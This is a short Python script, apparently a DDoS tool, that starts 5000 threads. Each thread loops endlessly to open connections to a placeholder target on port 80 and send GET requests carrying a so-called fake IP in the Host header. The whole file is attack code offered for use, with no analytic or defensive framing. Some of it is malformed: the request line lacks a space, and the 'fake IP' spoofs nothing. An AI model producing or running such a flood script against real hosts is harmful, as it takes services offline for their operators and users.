import threading
import socket

target = "ip or domain"
port  = 80 #for HTTP DDOS
fake_ip = "182.21.20.32"

def attack():
    while True:
        s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+ target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()
